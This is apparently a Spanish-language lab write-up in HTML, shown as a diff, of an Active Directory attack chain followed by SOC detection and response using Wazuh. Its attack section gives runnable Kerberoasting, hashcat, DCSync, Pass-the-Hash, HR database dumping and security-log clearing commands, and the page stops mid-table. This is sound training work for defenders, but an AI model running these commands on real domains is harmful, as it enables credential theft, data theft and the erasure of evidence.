+      <p>Una vez instalado el agente en las tres máquinas (AD1, AD2 y la estación W10), vuelvo al panel de agentes de Wazuh para verificar cada uno. Los tres aparecen como <strong>Active</strong> y reportando: la telemetría ya llega al SIEM y el laboratorio está listo para el ataque.</p>
+      <div class="callout callout-success">
+        <div class="callout-icon"><i class="fas fa-check-circle"></i></div>
+        <div class="callout-content">
+          <strong>Entorno listo — empezamos con el ataque</strong>
+          <p>
+            <span style="color:#00ffaa">●</span> Dominio AOM-SOC.lab operativo
+            &nbsp;·&nbsp;<span style="color:#00ffaa">●</span> SQL con la BBDD de RRHH cargada
+            &nbsp;·&nbsp;<span style="color:#00ffaa">●</span> Telemetría enviando a Wazuh
+            &nbsp;·&nbsp;<span style="color:#00ffaa">●</span> Kali lista en la misma red
+          </p>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ══ CADENA DE ATAQUE ══ -->
+    <section id="ataque" class="content-section grp-attack">
+      <h2><span class="section-number">05</span> Cadena de ataque</h2>
+
+      <p class="lead">
+        El escenario: el atacante ha comprado en la dark web una base de datos de credenciales filtradas. Entre ellas están las de <strong>Fran</strong>, un trabajador que nunca cambió su contraseña. Con ese único punto de apoyo, su objetivo es llegar a la BBDD de RRHH (DNI, IBAN, salarios), robarla y borrar su rastro.
+      </p>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-skull-crossbones"></i></div>
+        <div class="callout-content">
+          <strong>Solo en laboratorio aislado y de autoría propia</strong>
+          <p>Todas las técnicas van etiquetadas con su identificador MITRE ATT&amp;CK. El objetivo de ejecutar el ataque es entender qué busca el SOC en cada fase.</p>
+        </div>
+      </div>
+
+      <!-- Prep + Recon -->
+      <h3>Preparación y reconocimiento <span class="mitre-tag">T1046</span></h3>
+      <p>El atacante verifica su arsenal y localiza al controlador de dominio: solo un DC tiene abierto el puerto 88 (Kerberos).</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — verificación de herramientas y escaneo</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>which sliver-server impacket-secretsdump nxc bloodhound-python evil-winrm hashcat
+nmap -p 88 --open 192.168.60.0/24</code></pre>
+      </div>
+
+      <img src="ataque/verificacion-herramientas-pentesting.png" alt="Verificación de herramientas de pentesting en Kali" class="img-lab">
+      <p>El <code>which</code> devuelve la ruta de cada herramienta: están todas instaladas y operativas. Arsenal confirmado, podemos empezar.</p>
+      <img src="ataque/nmap-escaneo-puerto-88-kerberos.png" alt="Escaneo Nmap del puerto 88 Kerberos en la subred" class="img-lab">
+      <p>El escaneo devuelve un único host con el puerto 88 abierto: <code>192.168.60.10</code> es el controlador de dominio. Ya sabemos cuál es el corazón del dominio.</p>
+      <!-- Acceso inicial -->
+      <h3>Acceso inicial — credenciales válidas <span class="mitre-tag">T1078.002</span></h3>
+      <p>¿Siguen siendo válidas las credenciales de Fran? Lo comprobamos contra el DC por SMB.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — validación de credenciales</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>nxc smb 192.168.60.10 -u fran -p 'AOMpassword123!' -d AOM-SOC.lab</code></pre>
+      </div>
+
+      <img src="ataque/netexec-smb-autenticacion-inicial.png" alt="NetExec validando las credenciales de Fran por SMB" class="img-lab">
+      <p>El <code>[+]</code> en verde confirma que las credenciales de fran siguen siendo válidas. El atacante ya tiene un pie dentro del dominio como usuario autenticado.</p>
+      <!-- Kerberoasting -->
+      <h3>Kerberoasting <span class="mitre-tag">T1558.003</span></h3>
+      <p>
+        Cualquier usuario autenticado puede pedir el ticket (TGS) de una cuenta con SPN, y ese ticket va cifrado con el hash de su contraseña. Pedimos el de <code>svc_sql</code> y nos lo llevamos para crackearlo offline.
+      </p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — petición y guardado del TGS</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>impacket-GetUserSPNs AOM-SOC.lab/fran:'AOMpassword123!' -dc-ip 192.168.60.10 -request
+echo '$krb5tgs$18$svc_sql$AOM-SOC.LAB$...' > svc_sql.hash</code></pre>
+      </div>
+
+      <img src="ataque/impacket-getuserspns-tgs-hash.png" alt="Impacket GetUserSPNs obteniendo el hash TGS de svc_sql" class="img-lab">
+      <p>GetUserSPNs devuelve la cuenta <code>svc_sql</code> con su SPN y, debajo, el hash <code>$krb5tgs$18$</code> del ticket. Ese 18 indica cifrado AES256 (dato que retomamos en el lado defensa). Ya tenemos lo que íbamos a crackear.</p>
+      <img src="ataque/guardar-hash-kerberoasting-archivo.png" alt="Guardado del hash de kerberoasting en un archivo" class="img-lab">
+      <p>Volcamos ese hash a <code>svc_sql.hash</code>. Un paso intermedio sencillo, pero deja el terreno listo para hashcat.</p>
+      <!-- Crackeo -->
+      <h3>Crackeo offline <span class="mitre-tag">T1110.002</span></h3>
+      <p>
+        Esta fase ocurre <strong>entera en la Kali</strong>, sin tocar la red: el atacante es invisible para el SIEM porque no genera ni un log. Usamos el diccionario rockyou.
+      </p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — hashcat (modo 19700 = Kerberos TGS-REP AES256)</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>hashcat -m 19700 svc_sql.hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+      </div>
+
+      <img src="ataque/hashcat-inicio-fuerza-bruta-kerberos.png" alt="Inicio del crackeo con hashcat" class="img-lab">
+      <p>hashcat arranca en modo 19700 (Kerberos TGS-REP AES256) y empieza a probar el diccionario rockyou contra el hash. Todo offline, sin tocar la red.</p>
+      <img src="ataque/hashcat-contrasena-crackeada-exito.png" alt="hashcat crackea la contraseña de svc_sql con éxito" class="img-lab">
+      <p>Estado <strong>Cracked</strong>: hashcat devuelve la contraseña en claro de svc_sql → <code>Summer2023!</code>. Una contraseña de servicio débil y sin rotar, el clásico que se cuela en todos los entornos reales.</p>
+      <!-- DCSync -->
+      <h3>DCSync — volcado del NTDS <span class="mitre-tag">T1003.006</span></h3>
+      <p>
+        Resulta que <code>svc_sql</code> tiene permisos de replicación que <strong>no debería tener</strong>. Eso permite pedirle al DC que nos replique todos los secretos del dominio como si fuéramos otro controlador: un DCSync.
+      </p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — secretsdump por DRSUAPI (DCSync)</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>impacket-secretsdump 'AOM-SOC/svc_sql:Summer2023!@192.168.60.10' -just-dc-ntlm</code></pre>
+      </div>
+
+      <img src="ataque/impacket-secretsdump-extraccion-hashes.png" alt="Impacket secretsdump volcando los hashes del dominio" class="img-lab">
+      <p>El DCSync vuelca el NTDS completo: Administrator, krbtgt, fran, svc_sql y, lo que buscábamos, el hash NT de <code>paco</code>. A partir de aquí ya no necesitamos su contraseña, nos basta el hash.</p>
+      <!-- PtH / lateral -->
+      <h3>Pass-the-Hash y movimiento lateral <span class="mitre-tag">T1550.002 · T1021</span></h3>
+      <p>
+        Con el hash de <code>paco</code> no necesitamos su contraseña: lo usamos tal cual. Validamos contra el DC y saltamos al servidor SQL.
+      </p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — Pass-the-Hash y conexión al SQL</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>nxc smb 192.168.60.10 -u paco -H b812e8f01b55c2300689b83aaa906637
+impacket-mssqlclient AOM-SOC/paco@192.168.60.20 -windows-auth -hashes :b812e8f01b55c2300689b83aaa906637</code></pre>
+      </div>
+
+      <img src="ataque/netexec-pass-the-hash-pwn3d.png" alt="NetExec Pass-the-Hash con paco, Pwn3d" class="img-lab">
+      <p>El <code>(Pwn3d!)</code> confirma que el hash de paco es válido y que la cuenta es administradora en el DC. Pass-the-Hash exitoso, sin haber crackeado nada.</p>
+      <img src="ataque/conexion-mssql-pass-the-hash-paco.png" alt="Conexión al SQL como paco mediante Pass-the-Hash" class="img-lab">
+      <p>Entramos en el motor SQL de AD2 autenticados como paco, pasando solo el hash. Estamos dentro como administrador de dominio… aunque ahora viene el obstáculo inesperado.</p>
+      <!-- Acceso BBDD -->
+      <h3>Acceso a la base de datos <span class="mitre-tag">T1213</span></h3>
+      <p>
+        Y aquí el giro: paco es Domain Admin, pero al intentar abrir la BBDD de RRHH, el SQL le corta. <strong>Ser admin del dominio no da acceso automático a una base de datos</strong> — los permisos de SQL son una capa aparte.
+      </p>
+
+      <img src="ataque/error-permisos-acceso-base-datos-rrhh.png" alt="Error de permisos de paco al acceder a la BBDD RRHH" class="img-lab">
+      <p>La solución del atacante: volver a la cuenta que sí maneja ese SQL, <code>svc_sql</code>, cuya contraseña ya tenemos. Con ella explora la base de datos.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — exploración de la BBDD con svc_sql</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>impacket-mssqlclient AOM-SOC/svc_sql:'Summer2023!'@192.168.60.20 -windows-auth
+SQL> USE RRHH;
+SQL> SELECT name FROM sys.tables;</code></pre>
+      </div>
+
+      <img src="ataque/exploracion-tablas-columnas-sql.png" alt="Exploración de tablas y columnas SQL como svc_sql" class="img-lab">
+      <p>Con svc_sql el <code>USE RRHH</code> sí funciona. Listamos las tablas y vemos que <code>Empleados</code> y <code>MOCK_DATA</code> guardan los campos sensibles (dni, iban, salario). La caja fuerte está abierta.</p>
+      <!-- Exfiltración -->
+      <h3>Exfiltración <span class="mitre-tag">T1041 · T1005</span></h3>
+      <p>Montamos la consulta en un fichero y volcamos toda la tabla a un CSV en la Kali.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — exfiltración a CSV</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>echo "USE RRHH;" > query.sql
+echo "SELECT * FROM MOCK_DATA;" >> query.sql
+impacket-mssqlclient AOM-SOC/svc_sql:'Summer2023!'@192.168.60.20 -windows-auth -file query.sql > rrhh_exfiltrado.csv
+wc -l rrhh_exfiltrado.csv     # → 1015</code></pre>
+      </div>
+
+      <img src="ataque/extraccion-datos-sql-archivo-csv.png" alt="Extracción de los datos SQL a un archivo CSV" class="img-lab">
+      <p>Volcamos toda la tabla a <code>rrhh_exfiltrado.csv</code>. El <code>wc -l</code> confirma 1015 líneas: los ~1000 empleados ya están fuera del perímetro, en la máquina del atacante.</p>
+      <img src="ataque/visualizacion-datos-sensibles-exfiltrados.png" alt="Visualización de los datos sensibles exfiltrados" class="img-lab">
+      <p>Un <code>head</code> al CSV confirma el botín: nombres, DNIs, IBANs y salarios. Datos personales en claro — la exfiltración es un hecho consumado.</p>
+      <!-- Borrado -->
+      <h3>Borrado de huellas <span class="mitre-tag">T1070.001</span></h3>
+      <p>Por último, el atacante reutiliza el hash de paco para ejecutar un comando remoto que vacía el log de seguridad de Windows.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang code-lang-red">Kali — borrado del log de seguridad</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>nxc smb 192.168.60.20 -u paco -H b812e8f01b55c2300689b83aaa906637 -x "wevtutil cl Security"</code></pre>
+      </div>
+
+      <img src="ataque/borrado-registros-eventos-seguridad.png" alt="Borrado de los registros de eventos de seguridad" class="img-lab">
+      <p>El comando se ejecuta vía wmiexec y vacía el log de seguridad de AD2. El atacante cree que con esto ha borrado su rastro… pero se equivoca, como veremos justo a continuación.</p>
+      <div class="callout callout-danger">
+        <div class="callout-icon"><i class="fas fa-bug"></i></div>
+        <div class="callout-content">
+          <strong>El error del atacante</strong>
+          <p>Borrar el log local no borra lo que ya salió hacia el SIEM. Cada evento del ataque ya estaba en Wazuh, fuera de su alcance — y el propio borrado genera su evento (un 1102). Esa es la ventana del SOC. Empieza nuestro trabajo.</p>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ══ SOC · DETECCIÓN ══ -->
+    <section id="deteccion" class="content-section grp-soc">
+      <h2><span class="section-number">06</span> SOC · Detección y triaje</h2>
+
+      <div class="dual-panel">
+        <div class="panel-attack">
+          <h4><i class="fas fa-skull-crossbones" style="margin-right:6px"></i>El cambio de chip</h4>
+          <p>En el ataque tú decidías qué hacer. En el SOC reaccionas a lo que el SIEM te enseña: no a "ataques", sino a alertas sueltas.</p>
+        </div>
+        <div class="panel-defense">
+          <h4><i class="fas fa-shield-alt" style="margin-right:6px"></i>Función CSF: DETECT</h4>
+          <p>DE.CM (monitorización continua) y DE.AE (análisis de eventos). Por cada alerta: ¿real o ruido? ¿qué alcance? ¿escalo?</p>
+        </div>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-user-shield"></i></div>
+        <div class="callout-content">
+          <strong>Regla de oro del L1</strong>
+          <p>Un analista de nivel 1 no apaga servidores ni desconecta máquinas por su cuenta. Documenta, clasifica y escala. La acción autónoma solo existe si un runbook la autoriza. Recorremos las alertas en el orden en que el atacante las generó.</p>
+        </div>
+      </div>
+
+      <!-- Alerta 1 Kerberoasting -->
+      <h3>Alerta 1 — Kerberoasting <span class="mitre-tag">T1558.003</span></h3>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — petición de TGS contra la cuenta de servicio</div>
+        data.win.system.eventID:"4769" AND data.win.eventdata.serviceName:"svc_sql"
+      </div>
+      <img src="soc/Kerberoasting svc.png" alt="Detección de Kerberoasting en Wazuh (4769)" class="img-lab">
+      <p>
+        <strong>Triaje:</strong> ¿quién pide el ticket? Un usuario raso (fran). ¿svc_sql tiene SPN? Sí, por eso es kerberosteable. ¿Es normal pedir 4 TGS de una cuenta de servicio seguidos desde una IP desconocida? No. <strong>Matiz:</strong> el manual dice "RC4 (0x17)", pero aquí el ticket es AES256, así que la regla clásica no habría saltado — lo cacé buscando los 4769 contra la cuenta de servicio directamente. <strong>Veredicto:</strong> sospechoso alto, primer hilo.
+      </p>
+
+      <!-- Alerta 2 DCSync -->
+      <h3>Alerta 2 — DCSync <span class="mitre-tag">T1003.006</span></h3>
+      <p>
+        Esta es la alerta más interesante del lab, porque <strong>Wazuh no detecta el DCSync por defecto</strong>: el evento 4662 llega al manager, pero al no disparar ninguna regla, no entra en el panel de alertas. Tuve que crearme una regla personalizada — y ahí está la diferencia entre usar un SIEM y saber extenderlo.
+      </p>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — petición de derechos de replicación de directorio</div>
+        data.win.system.eventID:"4662" AND data.win.eventdata.properties:*1131f6aa*
+      </div>
+      <img src="soc/dcsync-deteccion-4662.png" alt="Detección de DCSync en Wazuh (4662 con GUID de replicación)" class="img-lab">
+      <p>La regla que escribí en <code>local_rules.xml</code> del manager:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Wazuh — regla personalizada 100200 (DCSync)</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>&lt;group name="windows,dcsync,"&gt;
+  &lt;rule id="100200" level="12"&gt;
+    &lt;if_group&gt;windows&lt;/if_group&gt;
+    &lt;field name="win.system.eventID"&gt;^4662$&lt;/field&gt;
+    &lt;field name="win.eventdata.properties" type="pcre2"&gt;1131f6ad|1131f6aa&lt;/field&gt;
+    &lt;field name="win.eventdata.subjectUserName" negate="yes" type="pcre2"&gt;\$$&lt;/field&gt;
+    &lt;description&gt;Posible DCSync: $(win.eventdata.subjectUserName) solicita derechos de replicacion&lt;/description&gt;
+    &lt;mitre&gt;&lt;id&gt;T1003.006&lt;/id&gt;&lt;/mitre&gt;
+  &lt;/rule&gt;
+&lt;/group&gt;</code></pre>
+      </div>
+
+      <p>Y con la regla cargada en el manager, el DCSync deja de pasar desapercibido: ahora el 4662 dispara la alerta <code>100200</code> de nivel 12 en el panel de Wazuh. Aquí está, filtrando por <code>rule.id:100200</code> — se ve <code>svc_sql</code> pidiendo derechos de replicación (no una cuenta de máquina), que es exactamente lo que la regla persigue.</p>
+      <img src="soc/rule-id100200.png" alt="Alerta personalizada 100200 disparada en Wazuh: svc_sql ejecuta un DCSync (4662)" class="img-lab">
+
+      <p>
+        <strong>El truco que la hace precisa:</strong> los controladores de dominio replican entre ellos legítimamente todo el rato, pero siempre con <strong>cuentas de máquina</strong> (terminan en <code>$</code>). Por eso el <code>negate</code> sobre <code>subjectUserName</code> con <code>\$$</code> excluye esa replicación normal: la regla solo salta cuando quien pide replicar es una cuenta que NO es de máquina — como <code>svc_sql</code>. Eso distingue el DCSync malicioso del tráfico legítimo, que es justo lo difícil de esta detección.
+      </p>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-key"></i></div>
+        <div class="callout-content">
+          <strong>La causa raíz del incidente</strong>
+          <p>Que svc_sql pudiera ejecutar un DCSync significa que tenía permisos de replicación que <strong>una cuenta de servicio nunca debería tener</strong>. Esta es la mala configuración que hace posible toda la cadena, y va directa a "lecciones aprendidas".</p>
+        </div>
+      </div>
+
+      <!-- Alerta 3 PtH -->
+      <h3>Alerta 3 — Pass-the-Hash de paco <span class="mitre-tag">T1550.002</span></h3>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — logon NTLM de una cuenta de administrador</div>
+        data.win.system.eventID:"4624" AND data.win.eventdata.targetUserName:"paco" AND data.win.eventdata.authenticationPackageName:"NTLM"
+      </div>
+      <img src="soc/Pass-the-Hash de Paco.png" alt="Detección de Pass-the-Hash de paco en Wazuh (4624 NTLM)" class="img-lab">
+      <p>
+        <strong>Triaje:</strong> la firma del PtH es el <strong>NTLM</strong>. En un dominio sano, una cuenta de administrador se autentica por Kerberos; un logon NTLM de paco, encima desde la IP del atacante, es señal fuerte. <strong>Veredicto:</strong> incidente casi confirmado.
+      </p>
+
+      <!-- Alerta 4 privilegios -->
+      <h3>Alerta 4 — Privilegios de Domain Admin <span class="mitre-tag">T1078.002</span></h3>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — asignación de privilegios especiales</div>
+        data.win.system.eventID:"4672" AND data.win.eventdata.subjectUserName:"paco"
+      </div>
+      <img src="soc/Privilegios especiales (Paco como Domain Admin).png" alt="Detección de privilegios de Domain Admin de paco (4672)" class="img-lab">
+      <p>
+        <strong>Triaje:</strong> el 4672 va pegado al 4624 anterior y confirma que la cuenta comprometida es potente. Correlacionado con el PtH desde .60.100 = un atacante operando con Domain Admin. <strong>Veredicto:</strong> crítico.
+      </p>
+
+      <!-- Alerta 5 acceso SQL -->
+      <h3>Alerta 5 — Acceso al SQL como svc_sql <span class="mitre-tag">T1078.002</span></h3>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — logon de la cuenta de servicio en el SQL</div>
+        data.win.system.eventID:"4624" AND data.win.eventdata.targetUserName:"svc_sql"
+      </div>
+      <img src="soc/Acceso a SQL01 como svc_sql.png" alt="Detección de acceso al SQL como svc_sql" class="img-lab">
+      <p>
+        <strong>Concepto clave:</strong> svc_sql <em>sí</em> debe loguearse en el SQL — eso solo no alarma. Lo que lo convierte en incidente es el <strong>origen</strong>: la cuenta de servicio usándose desde la IP del atacante en vez de por el propio servicio. Una cuenta de servicio autenticándose desde un sitio que no es el suyo es casi siempre compromiso. <strong>Veredicto:</strong> confirmado en contexto.
+      </p>
+
+      <!-- Alerta 6 exfil -->
+      <h3>Alerta 6 — Acceso masivo a la BBDD <span class="mitre-tag">T1213</span></h3>
+      <img src="soc/select en bbdd se ve el rastro en SSMS.png" alt="Rastro del SELECT sobre la BBDD visible en SSMS / SQL Audit" class="img-lab">
+      <p>
+        <strong>Triaje:</strong> esta es la joya de la corona, el objetivo del ataque. El rastro de SQL Server Audit (consultable con <code>sys.fn_get_audit_file</code>) deja dos cosas que cantan: la cuenta de servicio <code>svc_sql</code> tocando la base de datos de RRHH desde fuera, y una elevación a <code>sysadmin</code> de <code>paco</code> — ninguna es actividad normal de la aplicación. <strong>Veredicto: brecha de datos confirmada.</strong> Aquí se activa el RGPD — datos identificativos (DNI) y económicos (IBAN, salario).
+      </p>
+
+      <!-- Alerta 7 borrado -->
+      <h3>Alerta 7 — Borrado del log de seguridad <span class="mitre-tag">T1070.001</span></h3>
+      <div class="so-query">
+        <div class="so-query-label">Wazuh — log de seguridad borrado</div>
+        data.win.system.eventID:"1102"
+      </div>
+      <img src="soc/Audit Log Cleared.png" alt="Detección del borrado del log de seguridad en Wazuh (1102)" class="img-lab">
+      <p>
+        <strong>El detalle de oro:</strong> borrar el log local <em>genera</em> él mismo un 1102, y los eventos ya estaban replicados en Wazuh, fuera del alcance del atacante. <strong>Veredicto:</strong> confirma intención maliciosa. Incidente confirmado al 100%.
+      </p>
+    </section>
+
+
+    <!-- ══ SOC · CORRELACIÓN ══ -->
+    <section id="correlacion" class="content-section grp-soc">
+      <h2><span class="section-number">07</span> SOC · Correlación e incidente</h2>
+
+      <div class="panel-defense" style="margin-bottom:1.2rem">
+        <h4><i class="fas fa-shield-alt" style="margin-right:6px"></i>Función CSF: DETECT → RESPOND (RS.AN)</h4>
+        <p>El momento clave. Esas alertas dejan de ser ruido cuando comparten usuario, host e IP. Aquí se declara el incidente y arranca el reloj.</p>
+      </div>
+
+      <p>Puestas en una línea de tiempo, las piezas cuentan una sola historia:</p>
+
+      <div class="summary-table" style="overflow-x:auto">
+        <table class="summary-table">
+          <thead><tr><th>Orden</th><th>Alerta</th><th>Activo</th><th>Origen</th><th>Severidad</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>Kerberoasting (4769 svc_sql)</td><td>AOM-AD1</td><td>192.168.60.100</td><td><span class="sev-high">ALTA</span></td></tr>
+            <tr><td>2</td><td>DCSync (4662)</td><td>AOM-AD1</td><td>192.168.60.100</td><td><span class="sev-crit">CRÍTICA</span></td></tr>
+            <tr><td>3</td><td>Pass-the-Hash (4624 NTLM paco)</td><td>AOM-AD2</td><td>192.168.60.100</td><td><span class="sev-crit">CRÍTICA</span></td></tr>
+            <tr><td>4</td><td>Privilegios admin (4672 paco)</td><td>AOM-AD2</td><td>192.168.60.100</td><td><span class="sev-crit">CRÍTICA</span></td></tr>
+            <tr><td>5</td><td>Acceso SQL (4624 svc_sql)</td><td>AOM-AD2</td><td>192.168.60.100</td><td><span class="sev-high">ALTA</span></td></tr>
+            <tr><td>6</td><td>SELECT masivo (SQL Audit)</td><td>AOM-AD2</td><td>192.168.60.100</td><td><span class="sev-crit">CRÍTICA</span></td></tr>
+            <tr><td>7</td><td>Borrado de log (1102)</td><td>AOM-AD2</td><td>paco</td><td><span class="sev-crit">CRÍTICA</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="corr-box">
+        <h4><i class="fas fa-project-diagram" style="margin-right:6px"></i>Correlación — esto no son alertas sueltas, es UN incidente</h4>
+        <p>Un hilo común lo ata todo: una <strong>única IP origen (192.168.60.100)</strong> que recorre el dominio desde la petición de un ticket de servicio hasta el robo de la base de datos y el borrado de huellas, encadenando dos cuentas comprometidas (svc_sql → paco). Es una <strong>kill chain de un solo actor</strong>: acceso → escalada → movimiento lateral → exfiltración → anti-forense. Deja de ser ruido: se declara <strong>incidente CRÍTICO</strong> (compromiso de dominio + brecha de datos personales), se abre ticket, se avisa al IR Manager y se pre-avisa al DPO.</p>
+      </div>
+    </section>
+
+
+    <!-- ══ SOC · CONTENCIÓN ══ -->
+    <section id="contencion" class="content-section grp-soc">
+      <h2><span class="section-number">08</span> SOC · Contención y erradicación</h2>
+
+      <div class="panel-defense" style="margin-bottom:1.2rem">
+        <h4><i class="fas fa-shield-alt" style="margin-right:6px"></i>Función CSF: RESPOND (RS.MI)</h4>
+        <p>Incidente confirmado. La regla de oro: <strong>contener primero, investigar después</strong> — pero sin destruir evidencia volátil.</p>
+      </div>
+
+      <h3>Contención inmediata</h3>
+      <p>Aislar los equipos comprometidos por red (no apagar: se perdería la memoria), y cortar las cuentas que el atacante controla.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Contención — aislar y deshabilitar cuentas</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code># Aislar AOM-AD2 por firewall, permitiendo solo al SIEM (Active Response de Wazuh)
+netsh advfirewall firewall add rule name="SOC_ISOLATION_OUT" dir=out action=block remoteip=any
+netsh advfirewall firewall add rule name="SOC_ALLOW_WAZUH" dir=out action=allow remoteip=192.168.60.40
+
+# Cortar las cuentas comprometidas
+Disable-ADAccount -Identity fran
+Set-ADAccountPassword -Identity svc_sql -Reset
+Set-ADAccountPassword -Identity paco -Reset</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-memory"></i></div>
+        <div class="callout-content">
+          <strong>Preservar evidencia antes de tocar nada</strong>
+          <p>Capturar memoria y logs con su hash (cadena de custodia: quién, cuándo, qué) antes de erradicar. Una vez reinstalas, esa evidencia ya no existe.</p>
+        </div>
+      </div>
+
+      <h3>Erradicación — ir a la causa raíz</h3>
+      <p>No basta con resetear contraseñas. Hay que eliminar lo que hizo posible el ataque:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Erradicación — quitar la causa raíz del DCSync</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code># Revisar y RETIRAR los permisos de replicación que svc_sql no debería tener
+#   (DS-Replication-Get-Changes / -Get-Changes-All) sobre el dominio
+# Doble reset de krbtgt separado 10h+ (invalida posibles Golden Tickets)
+# Reinstalar AOM-AD2 desde imagen limpia — no "limpiar" un host comprometido</code></pre>
+      </div>
+
+      <ul style="margin:1rem 0 1rem 1.5rem; color:var(--text-secondary); line-height:1.9;">
+        <li><strong>Retirar los permisos de replicación de svc_sql</strong> — esto mata el DCSync para siempre</li>
+        <li><strong>Migrar svc_sql a gMSA</strong> — contraseña gestionada y rotada, elimina el kerberoasting</li>
+        <li><strong>Reset de toda cuenta logueada</strong> en los equipos implicados durante el incidente</li>
+        <li><strong>Reinstalar AOM-AD2</strong> desde imagen base — reinstalar tarda 1-2h, investigar todo tardaría días sin garantías</li>
+      </ul>
+    </section>
+
+
+    <!-- ══ SOC · RECUPERACIÓN ══ -->
+    <section id="recuperacion" class="content-section grp-soc">
+      <h2><span class="section-number">09</span> SOC · Recuperación</h2>
+
+      <div class="panel-defense" style="margin-bottom:1.2rem">
+        <h4><i class="fas fa-shield-alt" style="margin-right:6px"></i>Función CSF: RECOVER (RC.RP)</h4>
+        <p>Restaurar el servicio desde un punto limpio y endurecer antes de reconectar. No se reconecta algo igual de vulnerable que como cayó.</p>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Recuperación — restaurar la BBDD desde backup limpio</span>
+          <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copiar</button>
+        </div>
+        <pre><code>-- Identificar y restaurar un backup ANTERIOR al compromiso
+RESTORE DATABASE RRHH FROM DISK = 'E:\Backups\RRHH_limpio.bak' WITH REPLACE, RECOVERY;
+DBCC CHECKDB('RRHH') WITH NO_INFOMSGS;   -- validar integridad</code></pre>
+      </div>
+
+      <p>Antes de devolver el servidor a producción, endurecimiento:</p>
+      <ul style="margin:1rem 0 1rem 1.5rem; color:var(--text-secondary); line-height:1.9;">
+        <li>Permisos de SQL revisados (mínimo privilegio sobre RRHH)</li>
+        <li>Credential Guard y LSA Protection en los endpoints</li>
+        <li>Microsegmentación: el SQL solo accesible desde la subred de aplicación</li>
+        <li>Monitorización reforzada 2-4 semanas: thresholds bajos en los hosts implicados y hunting de IOCs en toda la red</li>
+      </ul>
+    </section>
+
+
+    <!-- ══ SOC · CIERRE ══ -->
+    <section id="cierre" class="content-section grp-soc">
+      <h2><span class="section-number">10</span> SOC · Cierre, métricas y AEPD</h2>
+
+      <div class="panel-defense" style="margin-bottom:1.2rem">
+        <h4><i class="fas fa-shield-alt" style="margin-right:6px"></i>Función CSF: RESPOND (RS.CO) → GOVERN</h4>
+        <p>El incidente no termina con la recuperación, termina con el aprendizaje. Documentación, métricas, notificación legal y mejora del SOC (ciclo cerrado).</p>
+      </div>
+
+      <h3>Línea de tiempo del incidente</h3>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-clock"></i></div>
+        <div class="callout-content">
+          <strong>Nota sobre los tiempos</strong>
+          <p>Este es un entorno de laboratorio donde las fases se ejecutaron en sesiones separadas y se repitieron pruebas, por lo que los <em>timestamps</em> originales de los logs no son consecutivos. La línea de tiempo y las métricas que siguen son una <strong>reconstrucción realista</strong> del incidente tal como ocurriría en producción, donde un atacante encadena las fases sin pausa. Los valores reflejan tiempos de respuesta SOC plausibles para un incidente de esta gravedad.</p>
+        </div>
+      </div>
+
+      <div class="summary-table" style="overflow-x:auto">
+        <table class="summary-table">
+          <thead><tr><th>T+</th><th>Evento</th><th>Lado</th></tr></thead>
+          <tbody>
+            <tr><td>00:00</td><td>Reconocimiento (nmap puerto 88) y validación de las credenciales de fran</td><td>Atacante</td></tr>
